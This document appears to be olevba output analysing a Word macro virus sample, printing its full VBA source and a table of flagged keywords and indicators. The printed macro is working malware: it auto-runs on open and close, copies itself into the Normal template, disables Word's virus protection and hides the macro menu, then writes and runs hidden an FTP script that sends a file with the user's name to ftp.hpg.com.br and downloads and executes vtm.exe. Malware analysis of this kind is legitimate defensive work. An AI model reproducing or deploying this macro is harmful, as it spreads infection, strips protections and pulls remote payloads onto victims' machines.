olevba 0.60.1.dev6 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Nome-3e60232a3fc05bbbe328a6dc56e4bd645908af11
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Nome-3e60232a3fc05bbbe328a6dc56e4bd645908af11 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO VT.bas 
in file: Virus.MSWord.Nome-3e60232a3fc05bbbe328a6dc56e4bd645908af11 - OLE stream: 'Macros/VBA/VT'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
On Error Resume Next
    Call VTI
    Call VTP
    Call VTA
    ActiveDocument.Save
End Sub

Sub AutoClose()
On Error Resume Next
    Call VTI
    Call VTP
    Call VTA
    ActiveDocument.Save
End Sub

Sub AutoNew()
On Error Resume Next
    Call VTI
End Sub
Sub AutoExit()
On Error Resume Next
    Call VTI
End Sub

Sub VTI()
On Error Resume Next
Set Nor = NormalTemplate.VBProject.VBComponents
Set Doc = ActiveDocument.VBProject.VBComponents
For i = 1 To Nor.Count
If Nor.Item(i).Name <> "VT" Then
tam = Nor.Item(i).CodeModule.CountOfLines
If tam > 0 Then
Nor.Item(i).CodeModule.DeleteLines 1, tam
End If
End If
Next
If Nor.Item("VT").Name <> "VT" Then
Doc("VT").Export "c:\VT.001"
Nor.Import "c:\VT.001"
NormalTemplate.Save
System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont") = 0
End If
If Doc.Item("VT").Name <> "VT" Then
Nor("VT").Export "c:\VT.001"
Doc.Import "c:\VT.001"
Cont = System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont")
Cont = Cont + 1
System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont") = Cont
End If
End Sub
Sub VTP()
On Error Resume Next
Options.VirusProtection = False
Options.SaveNormalPrompt = False
WordBasic.DisableAutoMacros 0
KeyBindings.Add KeyCode:=BuildKeyCode(wdKeyAlt, wdKeyF11), KeyCategory:=0, Command:="MGA"
ActiveDocument.ReadOnlyRecommended = False
CommandBars("Tools").Controls("Macro").Visible = False
End Sub

Sub VTA()
On Error Resume Next
Nome = Left(Application.UserName, 4)
Qtd = System.PrivateProfileString("", "HKEY_CURRENT_USER\VT", "Cont")
Open "c:\" & Nome & ".001" For Output As #1
Print #1, "Writer by SVX"
Print #1, "VXName: VT"
Print #1, "UserName: " & Nome
Print #1, "Contador: " & Qtd
Close #1
 
Open "c:\VT.ftp" For Output As #1
Print #1, "open ftp.hpg.com.br"
Print #1, "tlbysvx"
Print #1, "12345"
Print #1, "hash"
Print #1, "bin"
Print #1, "prompt"
Print #1, "lcd c:\"
Print #1, "mget vtm.exe"
Print #1, "send c:\" & Nome & ".001"
Print #1, "bye"
Close #1

Shell "c:\windows\ftp.exe -s:c:\VT.ftp", vbHide
Shell "c:\vtm.exe", vbHide

End Sub

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|AutoExec  |AutoNew             |Runs when a new Word document is created     |
|Suspicious|Open                |May open a file                              |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |vtm.exe             |Executable file name                         |
|IOC       |ftp.exe             |Executable file name                         |
+----------+--------------------+---------------------------------------------+

